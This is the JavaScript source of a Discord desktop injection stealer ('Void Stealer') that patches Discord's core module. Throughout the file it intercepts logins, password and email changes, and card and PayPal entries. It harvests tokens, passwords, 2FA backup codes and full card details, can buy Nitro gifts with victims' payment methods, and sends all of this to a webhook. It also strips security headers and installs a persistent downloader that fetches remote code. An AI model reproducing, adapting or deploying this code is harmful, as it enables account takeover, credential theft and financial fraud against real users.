const args = process.argv;
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron')


const config = {
    auto_buy_nitro: false,
    ping_on_run: true, 
    ping_val: '||@here||',
    embed_name: 'Void Stealer!',
    embed_icon: 'https://media.discordapp.net/attachments/940158268913901610/961989490077990952/40e1e4fee34818a90d540760dafbdfe8.jpg?width=324&height=405'.replace(/ /g,'%20'),
    embed_color: "#303037", 
    webhook: '%WEBHOOK%',
    injection_url: '',
    api: 'https://discord.com/api/v9/users/@me',
    bin: 'https://dpaste.com/api/',
    nitro: {
        boost: {
            year: {
                id: "521847234246082599",
                sku: "511651885459963904",
                price: "9999",
            },
            month: {
                id: "521847234246082599",
                sku: "511651880837840896",
                price: "999",
            },
        },
        classic: {
            month: {
                id: "521846918637420545",
                sku: "511651871736201216",
                price: "499",
            },
        },
    },
    filter: {
        urls: [
            'https://discord.com/api/v*/users/@me',
            'https://discordapp.com/api/v*/users/@me',
            'https://*.discord.com/api/v*/users/@me',
            'https://discordapp.com/api/v*/auth/login',
            'https://discord.com/api/v*/auth/login',
            'https://*.discord.com/api/v*/auth/login',
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
            'https://api.stripe.com/v*/setup_intents/*/confirm',
            'https://api.stripe.com/v*/payment_intents/*/confirm'
        ]
    },
    filter2: {
        urls: [
            'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json', 
            'https://*.discord.com/api/v*/applications/detectable', 
            'https://discord.com/api/v*/applications/detectable', 
            'https://*.discord.com/api/v*/users/@me/library', 
            'https://discord.com/api/v*/users/@me/library', 
            'wss://remote-auth-gateway.discord.gg/*',
        ]
    }
}

const discordPath = (function() {
    const useRelease = args[2] && args[2].toLowerCase() === "release";
    const releaseInput = useRelease ? args[3] && args[3].toLowerCase() : args[2] && args[2].toLowerCase();
    const release = releaseInput === "canary" ? "Discord Canary" : releaseInput === "ptb" ? "Discord PTB" : "Discord";
    let resourcePath = "";
    if (process.platform === "win32") {
        const basedir = path.join(process.env.LOCALAPPDATA, release.replace(/ /g, ""));
        const version = fs.readdirSync(basedir).filter(f => fs.lstatSync(path.join(basedir, f)).isDirectory() && f.split(".").length > 1).sort().reverse()[0];
        resourcePath = path.join(basedir, version, "resources");
    }
    else if (process.platform === "darwin") {
        const appPath = releaseInput === "canary" ? path.join("/Applications", "Discord Canary.app")
            : releaseInput === "ptb" ? path.join("/Applications", "Discord PTB.app")
            : useRelease && args[3] ? args[3] ? args[2] : args[2]
            : path.join("/Applications", "Discord.app");

        resourcePath = path.join(appPath, "Contents", "Resources");
    }

    if (fs.existsSync(resourcePath)) return resourcePath;
    return "";
})();

function updateCheck() {
    const appPath = path.join(discordPath, "app");
    const packageJson = path.join(appPath, "package.json");
    const resourceIndex = path.join(appPath, "index.js");
    const parentDir = path.resolve(path.resolve(__dirname, '..'), '..')
    const indexJs = `${parentDir}\\discord_desktop_core-2\\discord_desktop_core\\index.js`
    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

    if (process.platform === "win32" || process.platform === "darwin") {
        fs.writeFileSync(packageJson, JSON.stringify({
            name: "Discord-Injection",
            main: "index.js",
        }, null, 4));

        const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(discordPath, "app.asar")}')
if (fs.existsSync(bdPath)) {
    require(bdPath);
}`
        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
    }
    if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
    fs.rmdirSync(path.join(__dirname, 'initiation'));
    execScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`)
    return !1;
}

const execScript = (script) => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0)
};

const dpaste = async(content) => {
    return await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "${config.bin}", false);
    xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xmlHttp.send('content=${encodeURIComponent(content)}&expiry_days=30');
    xmlHttp.responseText;`)
};

const getInfo = async(token) => {
    const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`)
    return JSON.parse(info)
};

const getMfa = async(password, token) => {
    if (!token.startsWith('mfa.')) return 'N/A';
    let content = "";
    const mfa = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "${config.api}/mfa/codes", false);
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(JSON.stringify(${JSON.stringify({password: password, regenerate:false})}));
    xmlHttp.responseText
    `)
    const codes = JSON.parse(mfa).backup_codes
    for (const i in codes) {
        content += `${codes[i].code} ⋮ ${codes[i].consumed ? '\`✅ | Used\`' : '\`❌ | Not Used\`'}\n`
    }
    return await dpaste(content);
};

const fetchBilling = async(token) => {
    const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`)
    if (bill.length === 0 && !bill.lenght) {
        return "";
    }
    return JSON.parse(bill)
};

const getBilling = async (token) => {
    const data = await fetchBilling(token)
    if (data === "") return "❌";
    let billing = "";
    data.forEach(x => {
        if (x.type === 2 && !x.invalid) {
            billing += "✅" + " <:paypal:951139189389410365>";
        } else if (x.type === 1 && !x.invalid) {
            billing += "✅" + " 💳";
        } else {
            billing = "❌";
        }
    });
    if (billing === "") billing = "❌"
    return billing;
};

const Purchase = async (token, id, _type, _time) => {
    const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(
        {
            "expected_amount": config.nitro[_type][_time]['price'],
            "expected_currency": "usd",
            "gift": true,
            "payment_source_id": id,
            "payment_source_token": null,
            "purchase_token": "2422867c-244d-476a-ba4f-36e197758d97",
            "sku_subscription_plan_id": config.nitro[_type][_time]['sku'],
        }
    )}));
    xmlHttp.responseText`)
    if (req['gift_code']) {
        return 'https://discord.gift/'+req['gift_code'];
    } else return null;
};

const buyNitro = async (token) => {
    const data = await fetchBilling(token);
    if (data === "") return "Failed to Purchase ❌";
    
    let IDS = []
    data.forEach(x => {
        if (!x.invalid) {
            IDS = IDS.concat(x.id);
        }
    });
    for (let sourceID in IDS) {
        const first = Purchase(token, sourceID, 'boost', 'year')
        if (first !== null) {
            return first;
        } else {
            const second = Purchase(token, sourceID, 'boost', 'month')
            if (second !== null) {
                return second;
            } else {
                const third = Purchase(token, sourceID, 'classic', 'month')
                if (third !== null) {
                    return third;
                } else {
                    return 'Failed to Purchase ❌'
                }
            }
        }
    };
};

const getNitro = (flags) => {
    if (flags == 0) {
		return "No Nitro"
	}
	if (flags == 1) {
		return "<:classic:896119171019067423> \`Nitro Classic\`"
	}
	if (flags == 2) {
		return "<a:boost:824036778570416129> \`Nitro Boost\`"
	} else {
		return "\`No Nitro\`"
	}
};

const getBadges = (flags) => {
    let badges = "";
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const House_Bravery = 64;
	const House_Brilliance = 128;
	const House_Balance = 256;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	if ((flags & Discord_Employee) == Discord_Employee) {
		badges += "<:staff:874750808728666152> "
	}
	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
		badges += "<:partner:874750808678354964> "
	}
	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
		badges += "<:hypesquad_events:874750808594477056> "
	}
	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		badges += "<:bughunter_1:874750808426692658> "
	}
	if ((flags & House_Bravery) == House_Bravery) {
		badges += "<:bravery:874750808388952075> "
	}
	if ((flags & House_Brilliance) == House_Brilliance) {
		badges += "<:brilliance:874750808338608199> "
	}
	if ((flags & House_Balance) == House_Balance) {
		badges += "<:balance:874750808267292683> "
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		badges += "<:early_supporter:874750808414113823> "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		badges += "<:bughunter_2:874750808430874664> "
	}
	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		badges += "<:developer:874750808472825986> "
	}
	if (badges == "") {
		badges = "\`None\`"
	}
	return badges
};

const hooker = (content) => {
    execScript(`var xhr = new XMLHttpRequest();
    xhr.open("POST", "${config.webhook}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${JSON.stringify(content)}));
`)
};

/*
The Main Part
Scripts Ig
*/

const login = async (email, password, token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags);
    const billing = await getBilling(token);
    const mfa = await getMfa(password, token);
    const content = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [
            {
                "color": config.embed_color,

                "fields": [
                    {
                        "name": ":shield: Username",
                        "value": `\`${json.username +"#" + json.discriminator}\``,
                        "inline": true
                    },
                    {
                        "name": ":tools: Developer Id",
                        "value": `\`${json.id}\``,
                        "inline": true
                    },
                    {
                        "name": ":e_mail: Email",
                        "value": `\`${email}\``,
                        "inline": true
                    },
                    {
                        "name": ":white_check_mark: Verified",
                        "value": `\`${json.verified}\``,
                        "inline": true
                    },
                    {
                        "name": ":lock: Password",
                        "value": `\`${password}\``,
                        "inline": true
                    }
                    ,
                    {
                        "name": ":mobile_phone: Phone",
                        "value": `\`${json.phone}\``,
                        "inline": true
                    },
                    {
                        "name": "<a:discordnitro:929506332980162640> Subscription",
                        "value": nitro,
                        "inline": true
                    },
                    {
                        "name": "Payment Method",
                        "value": billing,
                        "inline": true
                    },
                    {
                        "name": "<a:exo_nitrobadgesroll:931578783977308220> Badges",
                        "value": badges,
                        "inline": true
                    },
                    {
                        "name": "Token",
                        "value": `\`token\``,
                        "inline": false
                    }
                ],
                "author": {
                    "name": json.username +"#" + json.discriminator + "・" + json.id,
                    "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                },
                "footer": {
                    "text": "Void Stealer v1 | Made By V O I D  D A D D Y.#1337"
                }
            }, {
                "title": ":closed_lock_with_key: 2fa Codes (mfa)",
                "description": mfa,
                "footer": {
                    "text": "Void Stealer v1 | Made By V O I D  D A D D Y.#1337"
                }
            }
        ]
    }
    if (config.ping_on_run) content['content'] = config.ping_val;
    hooker(content)
};

const passwordChanged = async (oldpassword, newpassword, token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags);
    const billing = await getBilling(token);
    const mfa = await getMfa(newpassword, token);
    const content = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [
            {
                "color": config.embed_color,

                "fields": [
                    {
                        "name": ":shield: Username",
                        "value": `\`${json.username +"#" + json.discriminator}\``,
                        "inline": true
                    },
                    {
                        "name": ":tools: Developer Id",
                        "value": `\`${json.id}\``,
                        "inline": true
                    },
                    {
                        "name": ":e_mail: Email",
                        "value": `\`${json.email}\``,
                        "inline": true
                    },
                    {
                        "name": ":white_check_mark: Verified",
                        "value": `\`${json.verified}\``,
                        "inline": true
                    },
                    {
                        "name": ":lock: Password",
                        "value": `\`${newpassword}\``,
                        "inline": true
                    }
                    ,
                    {
                        "name": ":mobile_phone: Phone",
                        "value": `\`${json.phone}\``,
                        "inline": true
                    },
                    {
                        "name": "<a:discordnitro:929506332980162640> Subscription",
                        "value": nitro,
                        "inline": true
                    },
                    {
                        "name": "Payment Method",
                        "value": billing,
                        "inline": true
                    },
                    {
                        "name": "<a:exo_nitrobadgesroll:931578783977308220> Badges",
                        "value": badges,
                        "inline": true
                    },
                    {
                        "name": "Token",
                        "value": `\`token\``,
                        "inline": false
                    }
                ],
                "author": {
                    "name": json.username +"#" + json.discriminator + "・" + json.id,
                    "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                },
                "footer": {
                    "text": "Void Stealer v1 | Made By V O I D  D A D D Y.#1337"
                }
            }, {
                "title": ":closed_lock_with_key: 2fa Codes (mfa)",
                "description": mfa,
                "footer": {
                    "text": "Void Stealer v1 | Made By V O I D  D A D D Y.#1337"
                }
            }
        ]
    }
    if (config.ping_on_run) content['content'] = config.ping_val;
    hooker(content)
};

const emailChanged = async (email, password, token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags);
    const billing = await getBilling(token);
    const mfa = await getMfa(password, token);
    const content = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [
            {
                "color": config.embed_color,

                "fields": [
                    {
                        "name": ":shield: Username",
                        "value": `\`${json.username +"#" + json.discriminator}\``,
                        "inline": true
                    },
                    {
                        "name": ":tools: Developer Id",
                        "value": `\`${json.id}\``,
                        "inline": true
                    },
                    {
                        "name": ":e_mail: Email",
                        "value": `\`${email}\``,
                        "inline": true
                    },
                    {
                        "name": ":white_check_mark: Verified",
                        "value": `\`${json.verified}\``,
                        "inline": true
                    },
                    {
                        "name": ":lock: Password",
                        "value": `\`${password}\``,
                        "inline": true
                    }
                    ,
                    {
                        "name": ":mobile_phone: Phone",
                        "value": `\`${json.phone}\``,
                        "inline": true
                    },
                    {
                        "name": "<a:discordnitro:929506332980162640> Subscription",
                        "value": nitro,
                        "inline": true
                    },
                    {
                        "name": "Payment Method",
                        "value": billing,
                        "inline": true
                    },
                    {
                        "name": "<a:exo_nitrobadgesroll:931578783977308220> Badges",
                        "value": badges,
                        "inline": true
                    }
                ],
                "author": {
                    "name": json.username +"#" + json.discriminator + "・" + json.id,
                    "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                },
                "footer": {
                    "text": "Void Stealer v1 | Made By V O I D  D A D D Y.#1337"
                }
            }, {
                "title": ":closed_lock_with_key: 2fa Codes (mfa)",
                "description": mfa,
                "footer": {
                    "text": "Void Stealer v1 | Made By V O I D  D A D D Y.#1337"
                }
            }
        ]
    }
    if (config.ping_on_run) content['content'] = config.ping_val;
    hooker(content)
};


const PaypalAdded = async (token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags);
    const billing = getBilling(token);
    const content = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [
            {
                "color": config.embed_color,

                "fields": [
                    {
                        "name": ":shield: Username",
                        "value": `\`${json.username +"#" + json.discriminator}\``,
                        "inline": true
                    },
                    {
                        "name": ":tools: Developer Id",
                        "value": `\`${json.id}\``,
                        "inline": true
                    },
                    {
                        "name": ":e_mail: Email",
                        "value": `\`${data.email}\``,
                        "inline": true
                    },
                    {
                        "name": ":white_check_mark: Verified",
                        "value": `\`${json.verified}\``,
                        "inline": true
                    },
                    {
                        "name": ":lock: Password",
                        "value": `\`None\``,
                        "inline": true
                    }
                    ,
                    {
                        "name": ":mobile_phone: Phone",
                        "value": `\`${json.phone}\``,
                        "inline": true
                    },
                    {
                        "name": "<a:discordnitro:929506332980162640> Subscription",
                        "value": nitro,
                        "inline": true
                    },
                    {
                        "name": "Payment Method",
                        "value": `\`Paypal Added GG!! Go Rape The PM\``,
                        "inline": true
                    },
                    {
                        "name": "<a:exo_nitrobadgesroll:931578783977308220> Badges",
                        "value": badges,
                        "inline": true
                    }
                ],
                "author": {
                    "name": json.username +"#" + json.discriminator + "・" + json.id,
                    "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                },
                "footer": {
                    "text": "Void Stealer v1 | Made By V O I D  D A D D Y.#1337"
                }
            }
        ]
    }
    if (config.ping_on_run) content['content'] = config.ping_val;
    hooker(content)
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags)
    const billing = await getBilling(token)
    const content = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [
            {
                "color": config.embed_color,

                "fields": [
                    {
                        "name": ":shield: Username",
                        "value": `\`${json.username +"#" + json.discriminator}\``,
                        "inline": true
                    },
                    {
                        "name": ":tools: Developer Id",
                        "value": `\`${json.id}\``,
                        "inline": true
                    },
                    {
                        "name": ":e_mail: Email",
                        "value": `\`${json.email}\``,
                        "inline": true
                    },
                    {
                        "name": ":white_check_mark: Verified",
                        "value": `\`${json.verified}\``,
                        "inline": true
                    },
                    {
                        "name": ":lock: Password",
                        "value": `\`None\``,
                        "inline": true
                    }
                    ,
                    {
                        "name": ":mobile_phone: Phone",
                        "value": `\`${json.phone}\``,
                        "inline": true
                    },
                    {
                        "name": "<a:discordnitro:929506332980162640> Subscription",
                        "value": nitro,
                        "inline": true
                    },
                    {
                        "name": "Payment Method",
                        "value": billing,
                        "inline": true
                    },
                    {
                        "name": "<a:exo_nitrobadgesroll:931578783977308220> Badges",
                        "value": badges,
                        "inline": true
                    }
                ],
                "author": {
                    "name": json.username +"#" + json.discriminator + "・" + json.id,
                    "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                },
                "footer": {
                    "text": "Void Stealer v1 | Made By V O I D  D A D D Y.#1337"
                }
            },
            {
                "title": ":credit_card: Credit Card",
                "description": `Credit Card Number: \`${number}\`\nSecurity Code: \`${cvc}\`\nCredit Card Expiration: \`${expir_month}/${expir_year}\``,
                "footer": {
                    "text": "Void Stealer v1 | Made By V O I D  D A D D Y.#1337"
                }
            }
        ]
    }
    if (config.ping_on_run) content['content'] = config.ping_val;
    hooker(content)
};

const nitroBought = async (token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags)
    const billing = await getBilling(token);
    const code = await buyNitro(token);
    const content = {
        username: config.embed_name,
        content: code,
        avatar_url: config.embed_icon,
        embeds: [
            {
                "color": config.embed_color,

                "fields": [
                    {
                        "name": ":shield: Username",
                        "value": `\`${json.username +"#" + json.discriminator}\``,
                        "inline": true
                    },
                    {
                        "name": ":tools: Developer Id",
                        "value": `\`${json.id}\``,
                        "inline": true
                    },
                    {
                        "name": ":e_mail: Email",
                        "value": `\`${json.email}\``,
                        "inline": true
                    },
                    {
                        "name": ":white_check_mark: Verified",
                        "value": `\`${json.verified}\``,
                        "inline": true
                    },
                    {
                        "name": ":lock: Password",
                        "value": `\`None\``,
                        "inline": true
                    }
                    ,
                    {
                        "name": ":mobile_phone: Phone",
                        "value": `\`${json.phone}\``,
                        "inline": true
                    },
                    {
                        "name": "<a:discordnitro:929506332980162640> Subscription",
                        "value": nitro,
                        "inline": true
                    },
                    {
                        "name": "Payment Method",
                        "value": billing,
                        "inline": true
                    },
                    {
                        "name": "<a:exo_nitrobadgesroll:931578783977308220> Badges",
                        "value": badges,
                        "inline": true
                    }
                ],
                "author": {
                    "name": json.username +"#" + json.discriminator + "・" + json.id,
                    "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                },
                "footer": {
                    "text": "Void Stealer v1 | Made By V O I D  D A D D Y.#1337"
                }
            },
            {
                "title": "<a:nitro_boost:793431120737468416> Nitro Bought",
                "description": `${code}`,
                "footer": {
                    "text": "Void Stealer v1 | Made By V O I D  D A D D Y.#1337"
                }
            }
        ]
    }
    if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
    hooker(content)
}

session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway")) {
        callback({
            cancel: true
        })
        return;
    }
    if (updateCheck()) {}

    callback({})
    return;
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    if (details.url.startsWith(config.webhook)) {
        if (details.url.includes("discord.com")) {
            callback({
                responseHeaders: Object.assign({
                    'Access-Control-Allow-Headers': "*"
                }, details.responseHeaders)
            });
        } else {
            callback({
                responseHeaders: Object.assign({
                    "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
                    'Access-Control-Allow-Headers': "*",
                    "Access-Control-Allow-Origin": "*"
                }, details.responseHeaders)
            });
        }
    } else {
        delete details.responseHeaders['content-security-policy'];
        delete details.responseHeaders['content-security-policy-report-only'];

        callback({
            responseHeaders: {
                ...details.responseHeaders,
                'Access-Control-Allow-Headers': "*"
            }
        })
    }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
    if (details.statusCode !== 200 && details.statusCode !== 202) return;
    const unparsedData = details.uploadData[0].bytes
    let data;
    try {
        data = JSON.parse(Buffer.from(unparsedData).toString())
    } catch (SyntaxError) {
        data = JSON.parse(JSON.stringify(Buffer.from(unparsedData).toString()))
    }
    const token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`)
    switch (true) {
        case details.url.endsWith('login'):
            login(data.login, data.password, token)//.catch(console.error)
            break;

        case details.url.endsWith('users/@me') && details.method === 'PATCH':
            if (!data.password) return;
            if (data.email) {
                emailChanged(data.email, data.password, token)//.catch(console.error)
            };
            if (data.new_password) {
                passwordChanged(data.password, data.new_password, token)//.catch(console.error)
            }
            break;

        case details.url.endsWith('tokens') && details.method === "POST":
            const item = querystring.parse(unparsedData.toString())
            ccAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)//.catch(console.error)
            break;

        case details.url.endsWith('paypal_accounts') && details.method === "POST":
            PaypalAdded(token)//.catch(console.error)
            break;

        case details.url.endsWith('confirm') && details.method === "POST":
            if (!config.auto_buy_nitro) return;
            setTimeout(() => {
                nitroBought(token)//.catch(console.error)
            }, 7500);
            break;

        default:
            break;
    }
});
module.exports = require('./core.asar');
